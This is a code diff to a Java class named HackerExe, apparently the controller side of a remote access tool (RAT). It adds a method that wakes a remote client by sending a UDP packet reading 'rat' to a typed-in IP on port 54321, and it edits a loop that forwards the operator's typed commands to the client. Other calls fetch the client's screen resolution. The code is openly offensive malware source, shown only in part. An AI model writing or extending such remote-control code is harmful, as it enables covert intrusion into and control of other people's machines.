@@ -51,6 +51,8 @@ public class HackerExe {
 	
 	public static void main (String [] args) throws IOException, InterruptedException {
 		HackerExe h = new HackerExe();
+		//h.wakeUpClient();
+
 		h.initListen();
 		h.getClientScreenResolution();
 		h.execute();
@@ -58,6 +60,19 @@ public class HackerExe {
 	}
 	
 	
+	private void wakeUpClient() throws IOException {
+		DatagramSocket socket_send = new DatagramSocket(null);
+		byte[] bufR = new byte[2048];
+		DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);
+		bufR = new String("rat").getBytes();
+		System.out.println("IP du Client :");
+		String ipWakeUp = new Scanner(System.in).nextLine();
+
+		dpR = new DatagramPacket(bufR, bufR.length, new InetSocketAddress(ipWakeUp, 54321));
+		socket_send.send(dpR);	
+	}
+
+
 	private void forwardTelecommande() {
 		
 		/***********************************************************************/
@@ -65,8 +80,8 @@ public class HackerExe {
 		     public void run() {
 		    	 
 		    	 while(true) {
+		    		 System.out.print("Commande : ");
 		    		String lineScanned = new Scanner(System.in).nextLine();
-		    		System.out.println("scan : "+lineScanned);
 		    		try { sendToClient( lineScanned ); } 
 		    		catch (IOException e) { e.printStackTrace(); break; }
 		    	 }
